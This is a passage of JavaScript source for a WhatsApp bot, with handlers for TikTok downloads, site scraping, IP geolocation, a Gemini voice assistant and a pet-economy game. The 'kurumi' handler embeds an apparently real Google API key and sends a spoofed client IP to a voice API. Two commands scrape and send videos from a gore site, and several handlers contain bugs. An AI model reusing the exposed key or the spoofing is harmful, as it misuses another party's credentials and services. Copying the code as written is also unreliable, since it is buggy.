break;

case 'tt2': {
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`;

  if (!text) return replyphistar(input);

  if (!(text.includes('http://') || text.includes('https://'))) return replyphistar(`url invalid, please input a valid url. Try with add http:// or https://`);
  if (!text.includes('tiktok.com')) return replyphistar(`Invalid Tiktok URL.`);
  async function tiktokDl(url) {
    return new Promise(async (resolve, reject) => {
      try {
        let data = [];
        function formatNumber(integer) {
          let numb = parseInt(integer);
          return Number(numb).toLocaleString().replace(/,/g, '.');
        }
        function formatDate(n, locale = 'en') {
          let d = new Date(n);
          return d.toLocaleDateString(locale, {
            weekday: 'long',
            day: 'numeric',
            month: 'long',
            year: 'numeric',
            hour: 'numeric',
            minute: 'numeric',
            second: 'numeric'
          });
        }
        let domain = 'https://www.tikwm.com/api/';
        let res = await (await axios.post(domain, {}, {
          headers: {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.tikwm.com',
            'Referer': 'https://www.tikwm.com/',
            'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': 'Android',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
          },
          params: {
            url: url,
            count: 12,
            cursor: 0,
            web: 1,
            hd: 1
          }
        })).data.data;
        if (res && !res.size && !res.wm_size && !res.hd_size) {
          res.images.map(v => {
            data.push({ type: 'photo', url: v });
          });
        } else {
          if (res && res.wmplay) {
            data.push({ type: 'watermark', url: 'https://www.tikwm.com' + res.wmplay });
          }
          if (res && res.play) {
            data.push({ type: 'nowatermark', url: 'https://www.tikwm.com' + res.play });
          }
          if (res && res.hdplay) {
            data.push({ type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res.hdplay });
          }
        }
        let json = {
          status: true,
          title: res.title,
          taken_at: formatDate(res.create_time).replace('1970', ''),
          region: res.region,
          id: res.id,
          durations: res.duration,
          duration: res.duration + ' Seconds',
          cover: 'https://www.tikwm.com' + res.cover,
          size_wm: res.wm_size,
          size_nowm: res.size,
          size_nowm_hd: res.hd_size,
          data: data,
          music_info: {
            id: res.music_info.id,
            title: res.music_info.title,
            author: res.music_info.author,
            album: res.music_info.album ? res.music_info.album : null,
            url: 'https://www.tikwm.com' + res.music || res.music_info.play
          },
          stats: {
            views: formatNumber(res.play_count),
            likes: formatNumber(res.digg_count),
            comment: formatNumber(res.comment_count),
            share: formatNumber(res.share_count),
            download: formatNumber(res.download_count)
          },
          author: {
            id: res.author.id,
            fullname: res.author.unique_id,
            nickname: res.author.nickname,
            avatar: 'https://www.tikwm.com' + res.author.avatar
          }
        };
        resolve(json);
      } catch (e) {
        reject(e);
      }
    });
  }
  let down = await tiktokDl(text);
  let berak = `[ *TIKTOK DOWNLOADER* ]

Videos:
Title: ${down.title}
Server: ${down.region}
ID: ${down.id}
Durasi: ${down.duration}
Size: ${down.size_nowm_hd}

Music Info:
ID: ${down.music_info.id}
Title: ${down.music_info.title}
Pemilik Musik: ${down.music_info.author}

Stats: 
Views: ${down.stats.views}
Likes: ${down.stats.likes}
Comment: ${down.stats.comment}
Share: ${down.stats.share}
Download: ${down.stats.download}

Author: 
ID: ${down.author.id}
Full Name: ${down.author.fullname}
Nickname: ${down.author.nickname}
Avatar: ${down.author.avatar}
`;
  await PhistarBotInc.sendMessage(m.chat, { video: { url: down.data[2].url }, caption: berak }, { quoted: m });
  await PhistarBotInc.sendMessage(m.chat, { audio: { url: down.music_info.url }, mimetype: "audio/mp4", ptt: true }, { quoted: m });
}
break;

case 'cinema': {
  async function cinema() {
    try {
      const response = await axios.get('https://21cineplex.com/');
      const html = response.data;
      const $ = cheerio.load(html);
      const results = [];
      $('.col-3 .movie').each((index, element) => {
        const movieTitle = $(element).find('.movie-desc h4').text().trim();
        const movieLabel = $(element).find('.movie-desc span.movie-label img').attr('src');
        const moviePoster = $(element).find('.movie-poster img').attr('src');
        const movieLink = $(element).find('a').attr('href');
        const data = {
          title: movieTitle,
          label: movieLabel,
          poster: moviePoster,
          link: movieLink
        };
        results.push(data);
      });
      return results;
    } catch (error) {
      console.error(error);
    }
  }
  cinema().then(results => {
    if (results.length === 0) {
      replyphistar('No results found.');
      return;
    }
    let replyTextt = `[ *CINEMA RANDOM* ]\n\n`;
    results.forEach((results) => {
      replyTextt += `Title: ${results.title}\nPoster: ${results.poster}\nLink: ${results.link}\n\n`;
    });
    replyphistar(replyTextt);
  }).catch(error => {
    replyphistar('An error occurred while randomizing in cinema.');
    replyphistar(error.message);
  });
}
break;

case 'cerpen': {
  if (!text) return replyphistar(`Example: ${prefix + command} child`);
  async function cerpen(category) {
    return new Promise((resolve, reject) => {
      let title = category.toLowerCase().replace(/[()*]/g, "");
      let judul = title.replace(/\s/g, "-");
      let page = Math.floor(Math.random() * 5);
      axios.get('http://cerpenmu.com/category/cerpen-' + judul + '/page/' + page)
        .then((get) => {
          let $ = cheerio.load(get.data);
          let link = [];
          $('article.post').each(function (a, b) {
            link.push($(b).find('a').attr('href'));
          });
          let random = link[Math.floor(Math.random() * link.length)];
          axios.get(random)
            .then((res) => {
              let $$ = cheerio.load(res.data);
              let hasil = {
                title: $$('#content > article > h1').text(),
                author: $$('#content > article').text().split('Cerpen Karangan: ')[1].split('Category: ')[0],
                Category: $$('#content > article').text().split('Category: ')[1].split('\n')[0],
                lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1].split('\n')[0],
                cerita: $$('#content > article > p').text()
              };
              resolve(hasil);
            });
        });
    });
  }
  let cepren = await cerpen(text);
  let cepen = `Title: ${cepren.title}\nAuthor: ${cepren.author}\nCategory: ${cepren.Category}\nLolos: ${cepren.lolos}\nCerita: ${cepren.cerita}`;
  await replyphistar(cepen);
}
break;

case 'fdroid': {
  if (!q) return replyphistar(`Example: ${prefix + command} app`);
  async function avzxxx(query) {
    const url = `https://search.f-droid.org/?q=${encodeURIComponent(query)}&lang=id`;
    try {
      const { data } = await axios.get(url);
      const $ = cheerio.load(data);
      const apps = [];
      $('.package-header').each((index, element) => {
        const title = $(element).find('.package-name').text().trim();
        const apkUrl = $(element).attr('href');
        const LinkGambar = $(element).find('.package-icon').attr('src');
        apps.push({ title, apkUrl, LinkGambar });
      });
      return apps;
    } catch (error) {
      console.error('Error:', error);
    }
  }
  avzxxx(q).then(apps => {
    if (apps.length === 0) {
      replyphistar('No results found.');
      return;
    }
    let replyTextt = `Search results for "${q}":\n\n`;
    apps.forEach((apps) => {
      replyTextt += `Title: ${apps.title}\nApk Url: ${apps.apkUrl}\nLink Gambar: ${apps.LinkGambar}\n\n`;
    });
    replyphistar(replyTextt);
  }).catch(error => {
    replyphistar('Terjadi kesalahan saat pencarian di fdroid.');
    replyphistar(error.message);
  });
}
break;

case 'style': case 'styletext': {
  async function styletext(teks) {
    return new Promise((resolve, reject) => {
      axios.get('http://qaz.wtf/u/convert.cgi?text=' + teks)
        .then(({ data }) => {
          let $ = cheerio.load(data);
          let hasil = [];
          $('table > tbody > tr').each(function (a, b) {
            hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() });
          });
          resolve(hasil);
        });
    });
  }
  if (!text) return replyphistar('Enter Query text!');
  let anu = await styletext(text);
  let teks = `Style Text From ${text}\n\n`;
  for (let i of anu) {
    teks += `🍀 *${i.name}* : ${i.result}\n\n`;
  }
  replyphistar(teks);
}
break;

case 'get': {
  if (typeof text !== 'string' || !text.trim()) {
    return replyphistar(`Add Input (Link)\n\nExample: ${prefix + command} https://example.com`);
  }
  const isUrl = (url) => {
    return url.match(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi);
  };
  const urlMatch = isUrl(text);
  if (!urlMatch) {
    return replyphistar(`Invalid URL provided. Please provide a valid URL.\n\nExample: ${prefix + command} https://example.com`);
  }
  const url = urlMatch[0]; // Use the first match
  try {
    const res = await axios.get(url);
    if (!/json|html|plain/.test(res.headers['content-type'])) {
      return replyphistar(`The content type of the provided URL is not supported.\n\nSupported types: json, html, plain text.`);
    }
    replyphistar(util.format(res.data));
  } catch (e) {
    replyphistar(`Error fetching data from the provided URL: ${util.format(e.message)}`);
  }
}
break;

case 'trackip': {
  if (!text) return replyphistar(`*Example:* ${prefix + command} 112.90.150.204`);
  try {
    let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());
    const formatIPInfo = (info) => {
      return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
    };
    if (!res.success) throw new Error(`IP ${text} not found!`);
    await PhistarBotInc.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    await delay(2000);
    replyphistar(formatIPInfo(res));
  } catch (e) {
    replyphistar(`Error: Unable to retrieve data for IP ${text}`);
  }
}
break;

case 'filmsearch': {
  if (!text) return replyphistar('Masukan query');
  replyphistar(mess.wait);
  async function film(query) {
    return new Promise((resolve, reject) => {
      const https = require('https');
      const url = `https://ruangmoviez.my.id/?s=${query}`;
      https.get(url, (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
          data += chunk;
        });
        resp.on('end', () => {
          let $ = cheerio.load(data);
          const movies = [];
          $('article.item-infinite').each((index, element) => {
            const movie = {};
            movie.link = $(element).find('a[itemprop="url"]').attr('href');
            movie.title = $(element).find('h2.entry-title a').text();
            movie.relTag = $(element).find('a[rel="category tag"]').map((i, el) => $(el).text()).get();
            movies.push(movie);
          });
          resolve({
            status: 200,
            creator: author,
            result: movies
          });
        });
      }).on("error", (err) => {
        resolve({
          status: 404,
          msg: err.message
        });
      });
    });
  }
  let { result } = await film(text);
  let cap = `\`Search Film From: ${text}\`\n\n`;
  for (let res of result) {
    cap += `*Title*: ${res.title}\n`;
    cap += `*Link*: ${res.link}\n`;
    cap += `*Genre*: ${res.relTag.map(v => v).join(', ')}\n\n`;
  }
  replyphistar(cap);
}
break;

case 'goredl': {
  if (!text) return replyphistar(`Example: ${prefix + command} seegore`);
  async function sgoredl(link) {
    return new Promise(async (resolve, reject) => {
      axios.get(link)
        .then(({
          data
        }) => {
          const $$ = cheerio.load(data);
          const format = {
            Title: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > header > h1').text(),
            views: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > div.s-post-meta-block.bb-mb-el > div > div > div.col-r.d-table-cell.col-md-6.col-sm-6.text-right-sm > div > span > span.count').text(),
            comment: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > div.s-post-meta-block.bb-mb-el > div > div > div.col-r.d-table-cell.col-md-6.col-sm-6.text-right-sm > div > a > span.count').text(),
            link: $$('video > source').attr('src')
          };
          const result = {
            creator: "Wudysoft",
            data: format
          };
          resolve(result);
        })
        .catch(reject);
    });
  }
  const gkanjut = await sgoredl(text);
  let pant = gkanjut.data;
  let ghann = `[ *SEEGORE DOWNLOADER* ]

Title: ${pant.Title}
Views: ${pant.views}
Comment: ${pant.comment}
Link: ${pant.link}
`;
  PhistarBotInc.sendMessage(m.chat, { video: { url: pant.link }, caption: ghann }, { quoted: m });
}
break;
// Command Handling
// Add or Set Sudo
case 'setsudo': case 'sudo': case 'addsudo': {
  if (!isCreator) return replyphistar('❌ Only the bot owner can use this command.');

  let number;
  if (quoted) {
    // Get the number from the replied message
    number = quoted.sender.split('@')[0];
  } else if (args[0]) {
    // Get the number from the command argument
    number = args[0];
  }

  if (!number || !/^\d+$/.test(number)) {
    return replyphistar('❌ Please provide a valid number or reply to a message to add to the sudo list.');
  }

  const jid = number + '@s.whatsapp.net';
  const sudoList = loadSudoList();

  if (sudoList.includes(jid)) return replyphistar(`❌ @${number} is already in the sudo list.`);
  sudoList.push(jid);
  saveSudoList(sudoList);

  replyphistar(`✅ Successfully added @${number} to the sudo list.`);
}
break;

// Delete Sudo
case 'delsudo': {
  if (!isCreator) return replyphistar('❌ Only the bot owner can use this command.');

  let number;
  if (quoted) {
    // Get the number from the replied message
    number = quoted.sender.split('@')[0];
  } else if (args[0]) {
    // Get the number from the command argument
    number = args[0];
  }

  if (!number || !/^\d+$/.test(number)) {
    return replyphistar('❌ Please provide a valid number or reply to a message to remove from the sudo list.');
  }

  const jid = number + '@s.whatsapp.net';
  const sudoList = loadSudoList();

  if (!sudoList.includes(jid)) return replyphistar(`❌ @${number} is not in the sudo list.`);
  const updatedList = sudoList.filter((user) => user !== jid);
  saveSudoList(updatedList);

  replyphistar(`✅ Successfully removed @${number} from the sudo list.`);
}
break;

case 'getsudo': case 'listsudo': {
  if (!isCreator) return replyphistar('❌ Only the bot owner can use this command.');
  const sudoList = loadSudoList();
  if (sudoList.length === 0) return replyphistar('❌ No numbers are currently in the sudo list.');

  const sudoNumbers = sudoList.map((jid) => jid.split('@')[0]).join('\n');
  replyphistar(`📜 *Sudo List:*\n\n${sudoNumbers}`);
}
break;

case 'goresearch': {
  if (!text) return replyphistar("Example: .goresearch girl");
  async function ssearchgore(query) {
    return new Promise(async (resolve, reject) => {
      axios.get('https://seegore.com/?s=' + query).then(dataa => {
        const $$$ = cheerio.load(dataa);
        let pagina = $$$('#main > div.container.main-container > div > div.bb-col.col-content > div > div > div > div > nav > ul > li:nth-child(4) > a').text();
        let slink = 'https://seegore.com/?s=' + query;
        axios.get(slink)
          .then(({
            data
          }) => {
            const $ = cheerio.load(data);
            const link = [];
            const judul = [];
            const uploader = [];
            const format = [];
            const thumb = [];
            $('#post-items > li > article > div.content > header > h2 > a').each(function(a, b) {
              link.push($(b).attr('href'));
            });
            $('#post-items > li > article > div.content > header > h2 > a').each(function(c, d) {
              let jud = $(d).text();
              judul.push(jud);
            });
            $('#post-items > li > article > div.content > header > div > div.bb-cat-links > a').each(function(e, f) {
              let upl = $(f).text();
              uploader.push(upl);
            });
            $('#post-items > li > article > div.post-thumbnail > a > div > img').each(function(g, h) {
              thumb.push($(h).attr('src'));
            });
            for (let i = 0; i < link.length; i++) {
              format.push({
                Title: judul[i],
                uploader: uploader[i],
                thumb: thumb[i],
                link: link[i]
              });
            }
            const result = {
              creator: "Wudysoft",
              data: format
            };
            resolve(result);
          })
          .catch(reject);
      });
    });
  }
  try {
    let haiyak = await ssearchgore(text);
    let coba = haiyak.data;
    let goreng = '';
    for (let i of coba) {
      goreng += `Title: ${i.Title}\nUploader: ${i.uploader}\nLink: ${i.link}\n\n`;
    }
    replyphistar(goreng);
  } catch (e) {
    replyphistar(e.toString());
  }
}
break;

case 'jadwalsholat': {
  if (!text) return replyphistar(`Example: .jadwalsholat jakarta`);
  async function jadwalSholat(query) {
    return new Promise((resolve, reject) => {
      axios
        .get(`https://umrotix.com/jadwal-sholat/${query}`)
        .then(({ data }) => {
          const $ = cheerio.load(data);
          $(
            "body > div > div.main-wrapper.scrollspy-action > div:nth-child(3) ",
          ).each(function (a, b) {
            result = {
              tanggal: $(b).find("> div:nth-child(2)").text(),
              imsak: $(b)
                .find(
                  "> div.panel.daily > div > div > div > div > div:nth-child(1) > p:nth-child(2)",
                )
                .text(),
              subuh: $(b)
                .find(
                  "> div.panel.daily > div > div > div > div > div:nth-child(2) > p:nth-child(2)",
                )
                .text(),
              dzuhur: $(b)
                .find(
                  "> div.panel.daily > div > div > div > div > div:nth-child(3) > p:nth-child(2)",
                )
                .text(),
              ashar: $(b)
                .find(
                  "> div.panel.daily > div > div > div > div > div:nth-child(4) > p:nth-child(2)",
                )
                .text(),
              maghrib: $(b)
                .find(
                  "> div.panel.daily > div > div > div > div > div:nth-child(5) > p:nth-child(2)",
                )
                .text(),
              isyak: $(b)
                .find(
                  "> div.panel.daily > div > div > div > div > div:nth-child(6) > p:nth-child(2)",
                )
                .text(),
            };
            resolve(result);
          });
        })
        .catch(reject);
    });
  }
  let sholatt = await jadwalSholat(text);
  replyphistar(`
[ *PRAYER SCHEDULE* ]

5 Times from Region ${text}

Tanggal: ${sholatt.tanggal}
Imsak: ${sholatt.imsak}
Shubuh: ${sholatt.subuh}
Dzuhur: ${sholatt.dzuhur}
Ashar: ${sholatt.ashar}
Maghrib: ${sholatt.maghrib}
Isya: ${sholatt.isyak}
`);
}
break;

case 'kurumi': {
  if (!text) return replyphistar(`Hi, how are you today??`);
  async function generateVoice(Query) {
    const formData = new FormData();
    formData.append("locale", 'id-ID');
    formData.append("content", `<voice name="ja-JP-AoiNeural">${Query}</voice>`);
    formData.append("ip", '46.161.194.33');
    const response = await fetch('https://app.micmonster.com/restapi/create', {
      method: 'POST',
      body: formData
    });
    return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
  }
  const sendToGemini = async (prompt) => {
    const apiKey = 'AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ'; // Dapatkan apikey dari  https://aistudio.google.com/app/apikey
    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=${apiKey}`;
    const body = {
      contents: [
        {
          parts: [
            { text: prompt }
          ]
        }
      ]
    };
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
      });
      const data = await response.json();
      if (response.ok) {
        return data;
      } else {
        throw new Error(data.error.message || 'Request failed');
      }
    } catch (error) {
      console.error('Error:', error.message);
      return null;
    }
  };
  const prompt = `Your name is I am Rumi, you are a virtual assistant developed directly from Phistar.`;
  const combinedPrompt = `${prompt} ${text}`;
  try {
    // Mengirim prompt ke API Gemini
    const response = await sendToGemini(combinedPrompt);
    if (response) {
      const candidates = response.candidates;
      let message = candidates && candidates.length > 0
        ? candidates[0].content.parts[0].text
        : 'No response received from model.';
      // Mengganti ** dengan * dan mengedit jawaban jika perlu
      messagee = message.replace(/\*\*/g, '*').replace(/#{2,}/g, '#');
    } else {
      PhistarBotInc.sendMessage(
        m.chat,
        { text: 'Gagal mendapatkan respons dari Gemini.' },
        { quoted: m }
      );
    }
  } catch (error) {
    console.error(error);
    PhistarBotInc.sendMessage(
      m.chat,
      { text: 'An error occurred while processing your request.' },
      { quoted: m }
    );
  }
  try {
    let res = await generateVoice(messagee);
    await replyphistar(messagee);
    if (res) await PhistarBotInc.sendMessage(m.chat, {
      audio: res,
      mimetype: 'audio/mp4',
      ptt: true,
      waveform: [100, 0, 100, 0, 100, 0, 100]
    }, {
      quoted: m
    });
  } catch (e) {
    await replyphistar(e.toString());
  }
}
break;
case 'tr': {
  if (!m.quoted.text) return replyphistar(`Reply to a message to be translated`);
  async function translate(query = "", lang) {
    if (!query.trim()) return "";
    const url = new URL("https://translate.googleapis.com/translate_a/single");
    url.searchParams.append("client", "gtx");
    url.searchParams.append("sl", "auto");
    url.searchParams.append("dt", "t");
    url.searchParams.append("tl", lang);
    url.searchParams.append("q", query);

    try {
      const response = await fetch(url.href);
      const data = await response.json();
      if (data) {
        return [data[0].map((item) => item[0].trim()).join("\n"), data[2]];
      } else {
        return "";
      }
    } catch (err) {
      throw err;
    }
  }

  let banjir = await translate(m.quoted.text, "id");
  replyphistar(`${banjir[0]}, ${banjir[1]}`);
}
break;

case 'txt2img': {
  if (!text) return replyphistar(`Example: ${prefix + command} cat`);
  async function photoleap(prompt) {
    try {
      let result = [];
      for (let i = 0; i < 3; i++) {
        let { data } = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
        result.push(data.result_url);
      }
      return result;
    } catch (e) {
      return ({ msg: 404 });
    }
  }

  let tahu = await photoleap(text);
  if (tahu.msg === 404) return replyphistar('❌ Failed to generate images.');
  for (const x of tahu) {
    PhistarBotInc.sendMessage(m.chat, { image: { url: x }, caption: `Done` }, { quoted: m });
  }
}
break;

case 'creategc':
case 'creategroup': {
  if (!isCreator) return replyphistar('For My Owner Only');
  if (!args.join(" ")) return replyphistar(`Use .creategc groupname`);
  try {
    let cret = await PhistarBotInc.groupCreate(args.join(" "), []);
    let response = await PhistarBotInc.groupInviteCode(cret.id);
    let teks2 = `      [ ${cret.subject} ]

▸ Name: ${cret.subject}
▸ Owner: @${cret.owner.split("@")[0]}
▸ Creation: ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id: ${cret.id}
▸ Join: chat.whatsapp.com/${response}`;
    replyphistar(teks2);
  } catch {
    replyphistar("Success");
  }
}
break;

case 'tiktoksearch':
case 'ttsearch': {
  const dann = require('d-scrape');
  if (!text) return replyphistar(`Example: ${prefix + command} jj epep`);
  replyphistar('Being processed ⏳');
  try {
    let anu = await dann.search.tiktoks(text);
    PhistarBotInc.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted: m });
  } catch (error) {
    replyphistar('Error');
  }
}
break;

case 'surah': {
  if (!q) return replyphistar(`Example: ${prefix + command} 113`);
  async function surah(no) {
    return new Promise(async (resolve, reject) => {
      axios.get('https://kalam.sindonews.com/surah/' + no)
        .then(({ data }) => {
          const $ = cheerio.load(data);
          const result = [];
          $('div.breadcrumb-new > ul > li:nth-child(5)').each(function(c, d) {
            result.audio = $(d).find('a').attr('href').replace('surah', 'audioframe');
          });
          const ar = [];
          const id = [];
          const lt = [];
          $('div.ayat-arab').each(function(a, b) {
            ar.push($(b).text());
          });
          $('li > div.ayat-text').each(function(e, f) {
            id.push($(f).text().replace(',', '').trim());
          });
          $('div.ayat-latin').each(function(g, h) {
            lt.push($(h).text().trim());
          });
          for (let i = 0; i < ar.length; i++) {
            result.push({
              arab: ar[i],
              indo: id[i],
              latin: lt[i],
            });
          }
          resolve(result);
        })
        .catch(reject);
    });
  }
  surah(q).then(result => {
    if (result.length === 0) {
      replyphistar('No results found.');
      return;
    }
    let replyTexttt = `Results from Surah for "${q}":\n\n`;
    result.forEach((result, index) => {
      if (result.arab && result.indo && result.latin) {
        replyTexttt += `${result.indo}\n${result.arab}\n${result.latin}\n\n`;
      }
    });
    replyphistar(replyTexttt);
  }).catch(error => {
    replyphistar('An error occurred while fetching the surah.');
    console.error(error);
  });
}
break;

case 'levelup': {
  if (!isCreator) return replyphistar('For My Owner Only');
  if (!args[0]) return replyphistar(`Example: ${prefix + command} on/off`);
  if (args[0] === 'on') {
    global.LEVELUP = true;
    await replyphistar('Successfully Activated Auto-Level-Up.');
  } else if (args[0] === 'off') {
    global.LEVELUP = false;
    await replyphistar('Successfully Deactivated Auto-Level-Up.');
  }
}
break;

case 'level': {
  const user = m.sender;

  // Load user data from JSON
  if (!userLevels[user]) {
    userLevels[user] = { xp: 0, level: 1, role: "Novice" }; // Initialize user data
    saveLevels(userLevels); // Save new user data
  }

  const userData = userLevels[user]; // Get user data

  // Display user stats with tagging
  replyphistar(
    `🌟 *Your Stats:*\n\n` +
    `👤 User: @${user.split("@")[0]}\n` +
    `🔹 *Level:* ${userData.level}\n` +
    `🔸 *Role:* ${userData.role}\n` +
    `📊 *XP:* ${userData.xp}/${userData.level * 100} XP\n\n` +
    `💬 Keep chatting to level up!`,
    { mentions: [user] }
  );
}
break;

function loadLevels() {
  if (fs.existsSync("./phistar/level.json")) {
    const data = fs.readFileSync("./phistar/level.json");
    return JSON.parse(data);
  }
  return {}; // Return an empty object if file doesn't exist
}

case 'leaderboard': {
  // Sort users by level and XP
  const sortedUsers = Object.entries(userLevels)
    .sort(([, a], [, b]) => b.level - a.level || b.xp - a.xp)
    .slice(0, 5); // Get the top 5 users

  if (sortedUsers.length === 0) {
    return replyphistar("🏆 No users found on the leaderboard yet. Start chatting to get ranked!");
  }

  // Generate leaderboard message
  const leaderboard = sortedUsers
    .map(
      ([id, data], index) =>
        `${index + 1}. @${id.split("@")[0]} - Level ${data.level} (${data.role}), ${data.xp}/${data.level * 100} XP`
    )
    .join("\n");

  replyphistar(`🏆 *Leaderboard:*\n\n${leaderboard}`, {
    mentions: sortedUsers.map(([id]) => id),
  });
}
break;

case 'buyguard': {
  const user = m.sender;
  const guardPets = [
    { name: "Dog", price: 100000, defense: 50 },
    { name: "Eagle", price: 200000, defense: 75 },
    { name: "Dragon", price: 500000, defense: 100 },
    { name: "Security Bot", price: 1000000, defense: 150 },
    { name: "Armed Guards", price: 2000000, defense: 200 }
  ];

  const shopList = guardPets.map((pet, index) => `${index + 1}. ${pet.name} - $${pet.price}`).join("\n");

  if (!args[0]) {
    return replyphistar(
      `🛡️ *Guard Pet Shop:*\n\n${shopList}\n\nUse *buyguard <number>* to purchase a guard.\nExample: *buyguard 3*`
    );
  }

  const petIndex = parseInt(args[0]) - 1;
  if (isNaN(petIndex) || petIndex < 0 || petIndex >= guardPets.length) {
    return replyphistar("❌ Invalid option. Use *buyguard* to see available guards.");
  }

  const selectedPet = guardPets[petIndex];

  if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
  if (economy[user].wallet < selectedPet.price) {
    return replyphistar(`❌ @${user.split("@")[0]}, you don't have enough money to buy ${selectedPet.name}.`, {
      mentions: [user],
    });
  }

  // Replace the current guard pet with the new one
  guardPetsData[user] = [{ name: selectedPet.name, defense: selectedPet.defense }];

  economy[user].wallet -= selectedPet.price;
  saveEconomy(economy);
  saveGuardPets(guardPetsData);

  replyphistar(
    `✅ @${user.split("@")[0]}, you purchased *${selectedPet.name}* for $${selectedPet.price}!\n\n💰 *Wallet Balance:* $${economy[user].wallet}`,
    { mentions: [user] }
  );
}
break;

case 'buypet': {
  const user = m.sender;
  const petTypes = [
    { name: "Cat", price: 300, strength: 10 },
    { name: "Dog", price: 500, strength: 20 },
    { name: "Dragon", price: 1000, strength: 50 },
  ];

  const petShop = petTypes.map((pet, index) => `${index + 1}. ${pet.name} - $${pet.price}`).join("\n");

  if (!args[0]) {
    return replyphistar(
      `🛒 *Pet Shop:*\n\n${petShop}\n\nUse *buypet <number>* to buy a pet.\nExample: *buypet 2*`
    );
  }

  const petIndex = parseInt(args[0]) - 1;
  if (isNaN(petIndex) || petIndex < 0 || petIndex >= petTypes.length) {
    return replyphistar("❌ Invalid pet number. Use the *buypet* command to see available pets.");
  }

  const selectedPet = petTypes[petIndex];

  if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
  if (economy[user].wallet < selectedPet.price) {
    return replyphistar(`❌ @${user.split("@")[0]}, you don't have enough money to buy ${selectedPet.name}.`, {
      mentions: [user],
    });
  }

  if (!pets[user]) pets[user] = [];
  pets[user].push({ name: selectedPet.name, level: 1, strength: selectedPet.strength });

  economy[user].wallet -= selectedPet.price;
  saveEconomy(economy);
  savePets(pets);

  replyphistar(
    `✅ @${user.split("@")[0]}, you purchased a *${selectedPet.name}* for $${selectedPet.price}!\n\n💰 *Wallet Balance:* $${economy[user].wallet}`,
    { mentions: [user] }
  );
}
break;

case 'mypet': {
  const user = m.sender;

  if (!pets[user] || pets[user].length === 0) {
    return replyphistar(`❌ @${user.split("@")[0]}, you don't have any pets. Use *buypet* to get one!`, {
      mentions: [user],
    });
  }

  const userPets = pets[user]
    .map(
      (pet, index) =>
        `${index + 1}. *${pet.name}* - Level ${pet.level}, Strength ${pet.strength}`
    )
    .join("\n");

  replyphistar(`🐾 *Your Pets:*\n\n${userPets}`, { mentions: [user] });
}
break;

case 'train': {
  const user = m.sender;

  if (!pets[user] || pets[user].length === 0) {
    return replyphistar(`❌ @${user.split("@")[0]}, you don't have any pets. Use *buypet* to get one!`, {
      mentions: [user],
    });
  }

  const petIndex = parseInt(args[0]) - 1;
  if (isNaN(petIndex) || petIndex < 0 || petIndex >= pets[user].length) {
    return replyphistar(`❌ Invalid pet number. Use *mypet* to see your pets.`);
  }

  const selectedPet = pets[user][petIndex];
  const trainingCost = selectedPet.level * 50;

  if (!economy[user]) economy[user] = { wallet: 0, bank: 0 };
  if (economy[user].wallet < trainingCost) {
    return replyphistar(
